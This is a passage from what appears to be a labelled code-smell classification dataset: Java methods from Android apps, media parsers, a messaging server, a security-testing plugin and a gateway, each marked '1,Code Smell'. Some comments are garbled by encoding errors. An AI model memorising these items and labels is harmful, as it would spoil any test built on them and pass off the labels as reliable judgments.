      mappingProcessor.processMethodMapping(className,firstLineNumber,lastLineNumber,type,name,arguments,newClassName,newFirstLineNumber,newLastLineNumber,newName);
    }
  }
}",1,Code Smell
"/** 
 * 鑾峰彇璇锋眰鐨勫弬鏁帮紝鏀惧埌log涓�
 * @param operLog 鎿嶄綔鏃ュ織
 * @throws Exception 寮傚父
 */
private void setRequestValue(JoinPoint joinPoint,SysOperLogEntity operLog) throws Exception {
  String requestMethod=operLog.getRequestMethod();
  if (HttpMethod.PUT.name().equals(requestMethod) || HttpMethod.POST.name().equals(requestMethod)) {
    String params=argsArrayToString(joinPoint.getArgs());
    operLog.setOperParam(StringUtils.substring(params,0,2000));
  }
 else {
    Map<?,?> paramsMap=(Map<?,?>)ServletUtils.getRequest().getAttribute(HandlerMapping.URI_TEMPLATE_VARIABLES_ATTRIBUTE);
    operLog.setOperParam(StringUtils.substring(paramsMap.toString(),0,2000));
  }
}",1,Code Smell
"@Override public List<FriendData> getFriendList(String userId,String clientId,long version){
  List<FriendData> out=new ArrayList<FriendData>();
  HazelcastInstance hzInstance=m_Server.getHazelcastInstance();
  MultiMap<String,FriendData> friendsMap=hzInstance.getMultiMap(USER_FRIENDS);
  Collection<FriendData> friends=friendsMap.get(userId);
  if (friends == null || friends.size() == 0) {
    friends=loadFriend(friendsMap,userId);
  }
  boolean needFriendMigrate=false;
  if (!StringUtil.isNullOrEmpty(clientId)) {
    MemorySessionStore.Session session=m_Server.getStore().sessionsStore().getSession(clientId);
    if (session != null && session.getMqttVersion() != null && session.getMqttVersion().protocolLevel() < MqttVersion.Wildfire_2.protocolLevel()) {
      needFriendMigrate=true;
    }
  }
  for (  FriendData friend : friends) {
    if (friend.getTimestamp() > version) {
      if (needFriendMigrate) {
        if (friend.getBlacked() > 0) {
          friend.setState(2);
        }
        out.add(friend);
      }
 else {
        out.add(friend);
      }
    }
  }
  if (mSyncDataPartSize > 0 && out.size() > mSyncDataPartSize) {
    out.sort(Comparator.comparingLong(FriendData::getTimestamp));
    out=out.subList(0,mSyncDataPartSize);
  }
  return out;
}",1,Code Smell
"private CharSequence getName(double lat,double _long){
  if (loading) {
    return lastName;
  }
  if (Math.abs(lastLat - lat) > 0.000001d || Math.abs(lastLong - _long) > 0.000001d || TextUtils.isEmpty(lastName)) {
    loading=true;
    Utilities.globalQueue.postRunnable(() -> {
      try {
        Geocoder geocoder=new Geocoder(ApplicationLoader.applicationContext,LocaleController.getInstance().getCurrentLocale());
        List<Address> addresses=geocoder.getFromLocation(lat,_long,1);
        if (addresses.isEmpty()) {
          lastName=LocationController.detectOcean(_long,lat);
          if (lastName == null) {
            lastName="""";
          }
 else {
            lastName=""馃寠 "" + lastName;
          }
        }
 else {
          Address addr=addresses.get(0);
          StringBuilder sb=new StringBuilder();
          HashSet<String> parts=new HashSet<>();
          parts.add(addr.getSubAdminArea());
          parts.add(addr.getAdminArea());
          parts.add(addr.getLocality());
          parts.add(addr.getCountryName());
          for (          String part : parts) {
            if (TextUtils.isEmpty(part)) {
              continue;
            }
            if (sb.length() > 0) {
              sb.append("", "");
            }
            sb.append(part);
          }
          lastName=sb.toString();
          String emoji=LocationController.countryCodeToEmoji(addr.getCountryCode());
          if (emoji != null && Emoji.getEmojiDrawable(emoji) != null) {
            lastName=emoji + "" "" + lastName;
          }
        }
      }
 catch (      Exception ignore) {
      }
      AndroidUtilities.runOnUIThread(() -> {
        lastLat=lat;
        lastLong=_long;
        loading=false;
        lastName=Emoji.replaceEmoji(lastName,nameTextView.getPaint().getFontMetricsInt(),false);
        nameTextView.setText(lastName);
      }
);
    }
);
  }
  return lastName;
}",1,Code Smell
"private boolean checkTitleLabelMotion(MotionEvent event){
  if (!currentMessageObject.isSponsored() || !currentMessageObject.sponsoredCanReport) {
    return false;
  }
  int x=(int)event.getX();
  int y=(int)event.getY();
  if (event.getAction() == MotionEvent.ACTION_DOWN) {
    if (x >= titleLabelX - AndroidUtilities.dp(6) && x <= titleLabelX + titleLabelLayoutWidth + AndroidUtilities.dp(6) && y >= titleLabelY - AndroidUtilities.dp(2) && y <= titleLabelY + titleLabelLayoutHeight + AndroidUtilities.dp(2)) {
      if (titleLabelBounce != null) {
        titleLabelBounce.setPressed(true);
      }
      isTitleLabelPressed=true;
      return true;
    }
  }
 else   if (event.getAction() == MotionEvent.ACTION_UP) {
    if (isTitleLabelPressed) {
      if (delegate != null) {
        delegate.didPressAboutRevenueSharingAds();
      }
      if (titleLabelBounce != null) {
        titleLabelBounce.setPressed(false);
      }
      playSoundEffect(SoundEffectConstants.CLICK);
      isTitleLabelPressed=false;
    }
  }
  return false;
}",1,Code Smell
"/** 
 * Get the boolean value associated with an index. The string values ""true"" and ""false"" are converted to boolean.
 * @param index The index must be between 0 and length() - 1.
 * @return The truth.
 * @throws JSONException If there is no value for the index or if the value is not convertible to boolean.
 */
public boolean getBoolean(int index) throws JSONException {
  Object object=this.get(index);
  if (object.equals(Boolean.FALSE) || (object instanceof String && ((String)object).equalsIgnoreCase(""false""))) {
    return false;
  }
 else   if (object.equals(Boolean.TRUE) || (object instanceof String && ((String)object).equalsIgnoreCase(""true""))) {
    return true;
  }
  throw new JSONException(""JSONArray["" + index + ""] is not a boolean."");
}",1,Code Smell
"public void startNalUnit(long position,int type,long pesTimeUs){
  nalUnitType=type;
  nalUnitTimeUs=pesTimeUs;
  nalUnitStartPosition=position;
  if ((allowNonIdrKeyframes && nalUnitType == NAL_UNIT_TYPE_NON_IDR) || (detectAccessUnits && (nalUnitType == NAL_UNIT_TYPE_IDR || nalUnitType == NAL_UNIT_TYPE_NON_IDR || nalUnitType == NAL_UNIT_TYPE_PARTITION_A))) {
    SliceHeaderData newSliceHeader=previousSliceHeader;
    previousSliceHeader=sliceHeader;
    sliceHeader=newSliceHeader;
    sliceHeader.clear();
    bufferLength=0;
    isFilling=true;
  }
}
public void startNalUnit(long position,int offset,int nalUnitType,long pesTimeUs){
  isFirstSlice=false;
  isFirstParameterSet=false;
  nalUnitTimeUs=pesTimeUs;
  nalUnitBytesRead=0;
  nalUnitStartPosition=position;
  if (nalUnitType >= VPS_NUT) {
    if (!writingParameterSets && readingSample) {
      outputSample(offset);
      readingSample=false;
    }
    if (nalUnitType <= PPS_NUT) {
      isFirstParameterSet=!writingParameterSets;
      writingParameterSets=true;
    }
  }
  nalUnitHasKeyframeData=(nalUnitType >= BLA_W_LP && nalUnitType <= CRA_NUT);
  lookingForFirstSliceFlag=nalUnitHasKeyframeData || nalUnitType <= RASL_R;
}",1,Code Smell
"/** 
 * URL编辑框
 * @param method
 * @param context
 * @param listener
 */
private static void showUrlEditView(final OperationMethod method,Context context,final FunctionListener listener){
  final PerformActionEnum actionEnum=method.getActionEnum();
  View v=LayoutInflater.from(ContextUtil.getContextThemeWrapper(context,R.style.AppDialogTheme)).inflate(R.layout.dialog_record_name,null);
  final EditText edit=(EditText)v.findViewById(R.id.dialog_record_edit);
  edit.setHint(R.string.function__please_input_url);
  if (actionEnum == PerformActionEnum.GENERATE_QR_CODE || actionEnum == PerformActionEnum.GENERATE_BAR_CODE) {
    edit.setHint(R.string.function__please_input_qr_code);
  }
  int title=(actionEnum == PerformActionEnum.GENERATE_QR_CODE || actionEnum == PerformActionEnum.GENERATE_BAR_CODE) ? R.string.function__input_qr_code : R.string.function__input_url;
  AlertDialog dialog=new AlertDialog.Builder(context,R.style.AppDialogTheme).setTitle(title).setView(v).setPositiveButton(R.string.function__input,new DialogInterface.OnClickListener(){
    @Override public void onClick(    DialogInterface dialog,    int which){
      LogUtil.i(TAG,""Positive "" + which);
      String data=edit.getText().toString();
      dialog.dismiss();
      if (actionEnum == PerformActionEnum.JUMP_TO_PAGE || actionEnum == PerformActionEnum.GENERATE_QR_CODE || actionEnum == PerformActionEnum.GENERATE_BAR_CODE) {
        method.putParam(OperationExecutor.SCHEME_KEY,data);
        listener.onProcessFunction(method,null);
      }
 else       if (actionEnum == PerformActionEnum.LOAD_PARAM) {
        method.putParam(OperationExecutor.APP_URL_KEY,data);
        listener.onProcessFunction(method,null);
      }
    }
  }
).setNegativeButton(R.string.constant__cancel,new DialogInterface.OnClickListener(){
    @Override public void onClick(    DialogInterface dialog,    int which){
      dialog.dismiss();
      listener.onCancel();
    }
  }
).create();
  dialog.getWindow().setType(com.alipay.hulu.common.constant.Constant.TYPE_ALERT);
  dialog.setCanceledOnTouchOutside(false);
  dialog.setCancelable(false);
  dialog.show();
}
",1,Code Smell
"void makeActive(Fragment f){
  if (mActive.get(f.mWho) != null) {
    return;
  }
  mActive.put(f.mWho,f);
  if (f.mRetainInstanceChangedWhileDetached) {
    if (f.mRetainInstance) {
      addRetainedFragment(f);
    }
 else {
      removeRetainedFragment(f);
    }
    f.mRetainInstanceChangedWhileDetached=false;
  }
  if (DEBUG)   Log.v(TAG,""Added fragment to active set "" + f);
}
",1,Code Smell
"private List<JMenuItem> generateIntruderTemplate(GeneralSettings generalSettings,URL targetUrl,String request){
  final List<JMenuItem> menuItems;
  if (request.chars().filter(c -> c == TemplateUtils.INTRUDER_PAYLOAD_MARKER).count() <= 2) {
    menuItems=List.of(createContextMenuItem(() -> generateIntruderTemplate(generalSettings,targetUrl,request,Http.AttackType.batteringram),GENERATE_CONTEXT_MENU_TEXT));
  }
 else {
    menuItems=Arrays.stream(Http.AttackType.values()).map(attackType -> createContextMenuItem(() -> generateIntruderTemplate(generalSettings,targetUrl,request,attackType),GENERATE_CONTEXT_MENU_TEXT + "" - "" + attackType)).collect(Collectors.toList());
  }
  return menuItems;
}
private void generateIntruderTemplate(GeneralSettings generalSettings,URL targetUrl,String request,Http.AttackType attackType){
  final Http http=new Http();
  final TransformedRequest intruderRequest=TemplateUtils.transformRequestWithPayloads(attackType,request);
  http.setTransformedRequest(intruderRequest);
  generateTemplate(generalSettings,targetUrl,http);
}",1,Code Smell
"@Override public int compareTo(ConfigInfoBase o){
  if (o == null) {
    return 1;
  }
  if (this.dataId == null) {
    if (o.getDataId() == null) {
      return 0;
    }
 else {
      return -1;
    }
  }
 else {
    if (o.getDataId() == null) {
      return 1;
    }
 else {
      int cmpDataId=this.dataId.compareTo(o.getDataId());
      if (cmpDataId != 0) {
        return cmpDataId;
      }
    }
  }
  if (this.group == null) {
    if (o.getGroup() == null) {
      return 0;
    }
 else {
      return -1;
    }
  }
 else {
    if (o.getGroup() == null) {
      return 1;
    }
 else {
      int cmpGroup=this.group.compareTo(o.getGroup());
      if (cmpGroup != 0) {
        return cmpGroup;
      }
    }
  }
  if (this.content == null) {
    if (o.getContent() == null) {
      return 0;
    }
 else {
      return -1;
    }
  }
 else {
    if (o.getContent() == null) {
      return 1;
    }
 else {
      int cmpContent=this.content.compareTo(o.getContent());
      if (cmpContent != 0) {
        return cmpContent;
      }
    }
  }
  return 0;
}",1,Code Smell
"private void runAlphaEnterTransition(){
  boolean removalsPending=!mPendingRemovals.isEmpty();
  boolean movesPending=!mPendingMoves.isEmpty();
  boolean changesPending=!mPendingChanges.isEmpty();
  boolean additionsPending=!mPendingAdditions.isEmpty();
  if (!removalsPending && !movesPending && !additionsPending&& !changesPending) {
    return;
  }
  for (  RecyclerView.ViewHolder holder : mPendingRemovals) {
    animateRemoveImpl(holder);
  }
  mPendingRemovals.clear();
  if (movesPending) {
    final ArrayList<MoveInfo> moves=new ArrayList<>();
    moves.addAll(mPendingMoves);
    mMovesList.add(moves);
    mPendingMoves.clear();
    Runnable mover=new Runnable(){
      @Override public void run(){
        for (        MoveInfo moveInfo : moves) {
          animateMoveImpl(moveInfo.holder,moveInfo);
        }
        moves.clear();
        mMovesList.remove(moves);
      }
    }
;
    if (delayAnimations && removalsPending) {
      View view=moves.get(0).holder.itemView;
      ViewCompat.postOnAnimationDelayed(view,mover,getMoveAnimationDelay());
    }
 else {
      mover.run();
    }
  }
  if (changesPending) {
    final ArrayList<ChangeInfo> changes=new ArrayList<>();
    changes.addAll(mPendingChanges);
    mChangesList.add(changes);
    mPendingChanges.clear();
    Runnable changer=new Runnable(){
      @Override public void run(){
        for (        ChangeInfo change : changes) {
          animateChangeImpl(change);
        }
        changes.clear();
        mChangesList.remove(changes);
      }
    }
;
    if (delayAnimations && removalsPending) {
      RecyclerView.ViewHolder holder=changes.get(0).oldHolder;
      ViewCompat.postOnAnimationDelayed(holder.itemView,changer,0);
    }
 else {
      changer.run();
    }
  }
  if (additionsPending) {
    final ArrayList<RecyclerView.ViewHolder> additions=new ArrayList<>();
    additions.addAll(mPendingAdditions);
    mPendingAdditions.clear();
    alphaEnterDelay=0;
    Collections.sort(additions,(i1,i2) -> i2.itemView.getTop() - i1.itemView.getTop());
    for (    RecyclerView.ViewHolder holder : additions) {
      animateAddImpl(holder);
    }
    additions.clear();
  }
}",1,Code Smell
"@Override public String getEngineType(){
  if (result == null) {
    return null;
  }
  if (result instanceof JobInfoResult && ((JobInfoResult)result).getTask() != null && ((JobInfoResult)result).getTask().get(""engineType"") != null) {
    return (String)((JobInfoResult)result).getTask().get(""engineType"");
  }
  return null;
}
",1,Code Smell
"static void testGeneralApi() throws Exception {
  IMResult<SystemSettingPojo> resultGetSystemSetting=GeneralAdmin.getSystemSetting(Group_Max_Member_Count);
  if (resultGetSystemSetting != null && resultGetSystemSetting.getErrorCode() == ErrorCode.ERROR_CODE_SUCCESS) {
    System.out.println(""success"");
  }
 else {
    System.out.println(""get system setting failure"");
    System.exit(-1);
  }
  IMResult<Void> resultSetSystemSetting=GeneralAdmin.setSystemSetting(Group_Max_Member_Count,""2000"",""最大群人数为2000"");
  if (resultSetSystemSetting != null && resultSetSystemSetting.getErrorCode() == ErrorCode.ERROR_CODE_SUCCESS) {
    System.out.println(""success"");
  }
 else {
    System.out.println(""get system setting failure"");
    System.exit(-1);
  }
  resultGetSystemSetting=GeneralAdmin.getSystemSetting(Group_Max_Member_Count);
  if (resultGetSystemSetting != null && resultGetSystemSetting.getErrorCode() == ErrorCode.ERROR_CODE_SUCCESS && resultGetSystemSetting.getResult().value.equals(""2000"")) {
    System.out.println(""success"");
  }
 else {
    System.out.println(""get system setting failure"");
    System.exit(-1);
  }
  IMResult<HealthCheckResult> health=GeneralAdmin.healthCheck();
  if (health != null && health.getErrorCode() == ErrorCode.ERROR_CODE_SUCCESS) {
    System.out.println(health.result);
  }
 else {
    System.out.println(""health check failure"");
    System.exit(-1);
  }
}",1,Code Smell
"@SuppressWarnings(""unchecked"") @Override public void run(final Status status){
  if (status.isOk()) {
    success((T)getData());
    return;
  }
  final Errors error=getError();
  if (this.retriesLeft > 0 && (ErrorsHelper.isInvalidPeer(error) || (this.retryOnInvalidEpoch && ErrorsHelper.isInvalidEpoch(error)))) {
    LOG.warn(""[Failover] status: {}, error: {}, [{}] retries left."",status,error,this.retriesLeft);
    this.retryRunner.run(error);
  }
 else {
    if (this.retriesLeft <= 0) {
      LOG.error(""[InvalidEpoch-Failover] status: {}, error: {}, {} retries left."",status,error,this.retriesLeft);
    }
    failure(error);
  }
}",1,Code Smell
"public void visitAnyInstruction(Clazz clazz,Method method,CodeAttribute codeAttribute,int offset,Instruction instruction){
  if (instruction.stackPushCount(clazz) == 1 && (referenceEscapeChecker.isInstanceEscaping(offset) || referenceEscapeChecker.isInstanceReturned(offset))) {
    TracedStack stackAfter=partialEvaluator.getStackAfter(offset);
    Value stackEntry=stackAfter.getTop(0);
    if (stackEntry.computationalType() == Value.TYPE_REFERENCE) {
      ReferenceValue referenceValue=stackEntry.referenceValue();
      if (referenceValue.isNull() != Value.ALWAYS && !ClassUtil.isInternalArrayType(referenceValue.getType())) {
        Clazz referencedClass=referenceValue.getReferencedClass();
        if (referencedClass != null) {
          logger.debug(""EscapingClassMarker: [{}.{}{}]: {} pushes escaping [{}]"",clazz.getName(),method.getName(clazz),method.getDescriptor(clazz),instruction.toString(offset),referencedClass.getName());
          referencedClass.hierarchyAccept(true,true,true,false,this);
        }
      }
    }
  }
}",1,Code Smell
"private float getScrollSpeed(){
  float speed=blockEntity.getSpeed();
  if (((facing.getAxisDirection() == Direction.AxisDirection.NEGATIVE) ^ upward) ^ ((alongX && !diagonal) || (alongZ && diagonal))) {
    speed=-speed;
  }
  if (sideways && (facing == Direction.SOUTH || facing == Direction.WEST) || (vertical && facing == Direction.EAST))   speed=-speed;
  return speed;
}
",1,Code Smell
"private boolean shouldInteractBlock(BlockHitResult hitResult,Hand hand){
  if (blockInteractHand.get() == HandMode.Both || (blockInteractHand.get() == HandMode.Mainhand && hand == Hand.MAIN_HAND) || (blockInteractHand.get() == HandMode.Offhand && hand == Hand.OFF_HAND)) {
    return false;
  }
  if (blockInteractMode.get() == ListMode.BlackList && blockInteract.get().contains(mc.world.getBlockState(hitResult.getBlockPos()).getBlock())) {
    return false;
  }
  return blockInteractMode.get() != ListMode.WhiteList || blockInteract.get().contains(mc.world.getBlockState(hitResult.getBlockPos()).getBlock());
}
",1,Code Smell
"private List<SubtitlesInfo> parseCaptions(JSONObject playerResponse){
  if (!playerResponse.containsKey(""captions"")) {
    return Collections.emptyList();
  }
  JSONObject captions=playerResponse.getJSONObject(""captions"");
  JSONObject playerCaptionsTracklistRenderer=captions.getJSONObject(""playerCaptionsTracklistRenderer"");
  if (playerCaptionsTracklistRenderer == null || playerCaptionsTracklistRenderer.isEmpty()) {
    return Collections.emptyList();
  }
  JSONArray captionsArray=playerCaptionsTracklistRenderer.getJSONArray(""captionTracks"");
  if (captionsArray == null || captionsArray.isEmpty()) {
    return Collections.emptyList();
  }
  List<SubtitlesInfo> subtitlesInfo=new ArrayList<>();
  for (int i=0; i < captionsArray.size(); i++) {
    JSONObject subtitleInfo=captionsArray.getJSONObject(i);
    String language=subtitleInfo.getString(""languageCode"");
    String url=subtitleInfo.getString(""baseUrl"");
    String vssId=subtitleInfo.getString(""vssId"");
    if (language != null && url != null && vssId != null) {
      boolean isAutoGenerated=vssId.startsWith(""a."");
      subtitlesInfo.add(new SubtitlesInfo(url,language,isAutoGenerated,true));
    }
  }
  return subtitlesInfo;
}",1,Code Smell
"@Nullable private static ApicFrame parseCoverArt(ParsableByteArray data){
  int atomSize=data.readInt();
  int atomType=data.readInt();
  if (atomType == Atom.TYPE_data) {
    int fullVersionInt=data.readInt();
    int flags=Atom.parseFullAtomFlags(fullVersionInt);
    String mimeType=flags == 13 ? ""image/jpeg"" : flags == 14 ? ""image/png"" : null;
    if (mimeType == null) {
      Log.w(TAG,""Unrecognized cover art flags: "" + flags);
      return null;
    }
    data.skipBytes(4);
    byte[] pictureData=new byte[atomSize - 16];
    data.readBytes(pictureData,0,pictureData.length);
    return new ApicFrame(mimeType,null,PICTURE_TYPE_FRONT_COVER,pictureData);
  }
  Log.w(TAG,""Failed to parse cover art attribute"");
  return null;
}",1,Code Smell
"private static List<Variable> columnToVariable(String prefixName,TermColumn column,Function<String,Term> termSupplier){
  List<Variable> variables=new ArrayList<>(1);
  String variableName=column.getName();
  if (CollectionUtils.isEmpty(column.getChildren())) {
    Term term=termSupplier.apply(column.getColumn());
    variables.add(Variable.of(column.getVariable(""_""),variableName).with(column));
    if (term != null) {
      List<TermValue> termValues=TermValue.of(term);
      String property=column.getPropertyOrNull();
      for (      TermValue termValue : termValues) {
        PropertyMetric metric=column.getMetricOrNull(termValue.getMetric());
        if (property != null && metric != null && termValue.getSource() == TermValue.Source.metric) {
          variables.add(Variable.of(property + ""_metric_"" + termValue.getMetric(),(prefixName == null ? column.getName() : prefixName) + ""_鎸囨爣_"" + metric.getName()).withTermType(column.getTermTypes()).withColumn(column.getColumn()).withMetadata(column.isMetadata()));
        }
      }
    }
  }
 else {
    Variable variable=Variable.of(column.getColumn(),column.getName());
    List<Variable> children=new ArrayList<>();
    variable.setChildren(children);
    variable.with(column);
    variables.add(variable);
    for (    TermColumn child : column.getChildren()) {
      children.addAll(columnToVariable(column.getName(),child,termSupplier));
    }
  }
  return variables;
}",1,Code Smell
"/** 
 * 鑾峰彇鏈哄櫒鐨勭湡瀹濱P 鏈夐棶棰� todo
 * @param request {@link ServerHttpRequest}
 * @return real host ip
 */
public String getRealHostIp(ServerHttpRequest request){
  String ip=request.getHeaders().getFirst(""x-forwarded-for"");
  if (ip == null || ip.length() == 0 || StringUtils.equalsIgnoreCase(GatewayConst.UNKNOWN,ip)) {
    ip=request.getHeaders().getFirst(""Proxy-Client-IP"");
  }
  if (ip == null || ip.length() == 0 || StringUtils.equalsIgnoreCase(GatewayConst.UNKNOWN,ip)) {
    ip=request.getHeaders().getFirst(""WL-Proxy-Client-IP"");
  }
  if (ip == null || ip.length() == 0 || StringUtils.equalsIgnoreCase(GatewayConst.UNKNOWN,ip)) {
    ip=request.getHeaders().getFirst(""HTTP_CLIENT_IP"");
  }
  if (ip == null || ip.length() == 0 || StringUtils.equalsIgnoreCase(GatewayConst.UNKNOWN,ip)) {
    ip=request.getHeaders().getFirst(""HTTP_X_FORWARDED_FOR"");
  }
  if (ip == null || ip.length() == 0 || StringUtils.equalsIgnoreCase(GatewayConst.UNKNOWN,ip)) {
    if (request.getRemoteAddress() != null) {
      ip=request.getRemoteAddress().getAddress().getHostAddress();
    }
 else {
      ip=GatewayConst.UNKNOWN;
    }
  }
  return ip;
}",1,Code Smell
"private void searchAnimated(String emoji){
  if (emoji == null) {
    return;
  }
  if (lastQuery != null && lastQueryType == 2 && lastQuery.equals(emoji) && !clear && keywordResults != null && !keywordResults.isEmpty()) {
    forceClose=false;
    createListView();
    if (containerView != null) {
      containerView.setVisibility(View.VISIBLE);
      containerView.invalidate();
    }
    return;
  }
  final int id=++lastQueryId;
  if (searchRunnable != null) {
    AndroidUtilities.cancelRunOnUIThread(searchRunnable);
  }
  searchRunnable=() -> {
    ArrayList<MediaDataController.KeywordResult> standard=new ArrayList<>(1);
    standard.add(new MediaDataController.KeywordResult(emoji,null));
    MediaDataController.getInstance(currentAccount).fillWithAnimatedEmoji(standard,15,false,false,false,() -> {
      if (id == lastQueryId) {
        lastQuery=emoji;
        lastQueryType=2;
        standard.remove(standard.size() - 1);
        if (!standard.isEmpty()) {
          clear=false;
          forceClose=false;
          createListView();
          if (containerView != null) {
            containerView.setVisibility(View.VISIBLE);
            containerView.invalidate();
          }
          keywordResults=standard;
          if (adapter != null) {
            adapter.notifyDataSetChanged();
          }
        }
 else {
          clear=true;
          forceClose();
        }
      }
    }
);
  }
;
  if (keywordResults == null || keywordResults.isEmpty()) {
    AndroidUtilities.runOnUIThread(searchRunnable,600);
  }
 else {
    searchRunnable.run();
  }
}",1,Code Smell
"public static Intent getIntent(Context context,boolean requiresStandardLaunchMode){
  String[] actions=new String[]{Settings.ACTION_WIFI_SETTINGS,Settings.ACTION_NETWORK_OPERATOR_SETTINGS,Settings.ACTION_DEVICE_INFO_SETTINGS,Settings.ACTION_DISPLAY_SETTINGS,Settings.ACTION_SOUND_SETTINGS,Settings.ACTION_INTERNAL_STORAGE_SETTINGS,Settings.ACTION_SECURITY_SETTINGS,Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS};
  Intent intent=new Intent(""null"").setPackage(PACKAGE_NAME);
  PackageManager pm=context.getPackageManager();
  for (  String action : actions) {
    intent.setAction(action);
    try {
      ResolveInfo resolveInfo=pm.resolveActivity(intent,0);
      if (resolveInfo != null && resolveInfo.activityInfo != null && resolveInfo.activityInfo.exported && (!requiresStandardLaunchMode || resolveInfo.activityInfo.launchMode == ActivityInfo.LAUNCH_MULTIPLE)) {
        if (requiresStandardLaunchMode) {
          LOGGER.i(""Found action for Sui shortcut (standard launch mode): %s"",action);
        }
 else {
          LOGGER.w(""Found action for Sui shortcut: %s"",action);
        }
        break;
      }
    }
 catch (    Throwable e) {
      LOGGER.w(e,""resolveActivity %s"",intent);
    }
    intent.setAction(""null"");
  }
  if (""null"".equals(intent.getAction())) {
    if (requiresStandardLaunchMode) {
      intent=getIntent(context,false);
    }
 else {
      LOGGER.w(""Use launch intent for Sui shortcut"");
      intent=pm.getLaunchIntentForPackage(PACKAGE_NAME);
    }
  }
  intent.setFlags(FLAGS);
  intent.putExtra(SHORTCUT_EXTRA,1);
  return intent;
}",1,Code Smell
"@Override public EventAck handleEvent(ChannelInfo channelInfo,LogPointEvent event,EventContext context){
  probeEventListener.onProbeEvent(channelInfo,event,context);
  String logPointId=event.getLogPointId();
  LogPointConfig logPointConfig=logPointService.getLogPoint(channelInfo.getWorkspaceId(),logPointId);
  saveEventHistory(channelInfo,event,context.getRawMessage(),logPointConfig);
  sendWebhookMessage(channelInfo,context.getRawMessage(),logPointConfig);
  CompletableFuture<Boolean> completableFuture=logPointService.checkExpireAndDecrementLogPointExpireCount(channelInfo.getWorkspaceId(),logPointId);
  completableFuture.thenAccept(isExpire -> {
    if (isExpire) {
      if (logPointConfig == null) {
        return;
      }
      if (!logPointConfig.hasTag()) {
        List<String> applications=new ArrayList<>(applicationService.filterApplications(channelInfo.getWorkspaceId(),logPointConfig.getApplicationFilters()));
        RemoveLogPointRequest request=prepareRemoveLogPointRequest(event,logPointId,applications);
        logPointService.removeLogPoint(channelInfo.getWorkspaceId(),channelInfo.getUserId(),logPointId);
        communicator.sendRequestToApps(channelInfo,request,applications);
      }
    }
  }
);
  return null;
}
",1,Code Smell
"public void onMatch(RelOptRuleCall call){
  final Aggregate topAgg=call.rel(0);
  final Aggregate bottomAgg=call.rel(1);
  if (topAgg.getGroupCount() > bottomAgg.getGroupCount()) {
    return;
  }
  final ImmutableBitSet bottomGroupSet=bottomAgg.getGroupSet();
  final Map<Integer,Integer> map=new HashMap<>();
  bottomGroupSet.forEach(v -> map.put(map.size(),v));
  for (  int k : topAgg.getGroupSet()) {
    if (!map.containsKey(k)) {
      return;
    }
  }
  final ImmutableBitSet topGroupSet=topAgg.getGroupSet().permute(map);
  if (!bottomGroupSet.contains(topGroupSet)) {
    return;
  }
  boolean hasEmptyGroup=topAgg.getGroupSets().stream().anyMatch(n -> n.isEmpty());
  final List<AggregateCall> finalCalls=new ArrayList<>();
  for (  AggregateCall topCall : topAgg.getAggCallList()) {
    if (!isAggregateSupported(topCall) || topCall.getArgList().size() == 0) {
      return;
    }
    int bottomIndex=topCall.getArgList().get(0) - bottomGroupSet.cardinality();
    if (bottomIndex >= bottomAgg.getAggCallList().size() || bottomIndex < 0) {
      return;
    }
    AggregateCall bottomCall=bottomAgg.getAggCallList().get(bottomIndex);
    if (!isAggregateSupported(bottomCall) || (bottomCall.getAggregation() == SqlStdOperatorTable.COUNT && hasEmptyGroup)) {
      return;
    }
    SqlSplittableAggFunction splitter=Objects.requireNonNull(bottomCall.getAggregation().unwrap(SqlSplittableAggFunction.class));
    AggregateCall finalCall=splitter.merge(topCall,bottomCall);
    if (finalCall == null) {
      return;
    }
    finalCalls.add(finalCall);
  }
  ImmutableList<ImmutableBitSet> newGroupingSets=null;
  if (topAgg.getGroupType() != Group.SIMPLE) {
    newGroupingSets=ImmutableBitSet.ORDERING.immutableSortedCopy(ImmutableBitSet.permute(topAgg.getGroupSets(),map));
  }
  final Aggregate finalAgg=topAgg.copy(topAgg.getTraitSet(),bottomAgg.getInput(),topGroupSet,newGroupingSets,finalCalls);
  call.transformTo(finalAgg);
}",1,Code Smell
"public void visitProgramMethod(ProgramClass programClass,ProgramMethod programMethod){
  if (ClassUtil.isInitializer(programMethod.getName(programClass))) {
    if (ClassUtil.internalMethodParameterCount(programMethod.getDescriptor(programClass)) == 1) {
      Value value=StoringInvocationUnit.getMethodParameterValue(programMethod,1);
      if (value != null && value.computationalType() == Value.TYPE_REFERENCE && value.referenceValue().isNotNull() == Value.ALWAYS) {
        programMethod.attributesAccept(programClass,this);
      }
 else {
        wrapCounter=Integer.MIN_VALUE;
      }
    }
 else {
      wrapCounter=Integer.MIN_VALUE;
    }
  }
}",1,Code Smell
"public static ParcelableListSlice<PackageInfo> getInstalledPackagesFromAllUsers(int flags,boolean filterNoProcess) throws RemoteException {
  List<PackageInfo> res=new ArrayList<>();
  IPackageManager pm=getPackageManager();
  if (pm == null)   return ParcelableListSlice.emptyList();
  for (  var user : UserService.getUsers()) {
    ParceledListSlice<PackageInfo> infos;
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
      infos=pm.getInstalledPackages((long)flags,user.id);
    }
 else {
      infos=pm.getInstalledPackages(flags,user.id);
    }
    res.addAll(infos.getList().parallelStream().filter(info -> info.applicationInfo != null && info.applicationInfo.uid / PER_USER_RANGE == user.id).filter(info -> {
      try {
        return isPackageAvailable(info.packageName,user.id,true);
      }
 catch (      RemoteException e) {
        return false;
      }
    }
).collect(Collectors.toList()));
  }
  if (filterNoProcess) {
    return new ParcelableListSlice<>(res.parallelStream().filter(packageInfo -> {
      try {
        PackageInfo pkgInfo=getPackageInfoWithComponents(packageInfo.packageName,MATCH_ALL_FLAGS,packageInfo.applicationInfo.uid / PER_USER_RANGE);
        return !fetchProcesses(pkgInfo).isEmpty();
      }
 catch (      RemoteException e) {
        Log.w(TAG,""filter failed"",e);
        return true;
      }
    }
).collect(Collectors.toList()));
  }
  return new ParcelableListSlice<>(res);
}
",1,Code Smell
"/** 
 * Trying to filter languages preferred by the user
 */
private MediaTrack[][] filterByLanguage(MediaTrack[][] trackGroupList,MediaTrack originTrack){
  if (!(originTrack instanceof AudioTrack) || trackGroupList.length <= 1) {
    return trackGroupList;
  }
  String audioLanguage=PlayerData.instance(mContext).getAudioLanguage();
  String resultLanguage=null;
  String originLanguage=null;
  if (!TextUtils.isEmpty(audioLanguage) && originTrack.isSaved) {
    resultLanguage=audioLanguage;
  }
  if (originTrack.format != null && !TextUtils.isEmpty(originTrack.format.language)) {
    originLanguage=originTrack.format.language;
  }
  if (resultLanguage == null && originLanguage == null) {
    return trackGroupList;
  }
  List<MediaTrack[]> resultTracks=null;
  List<MediaTrack[]> originTracks=null;
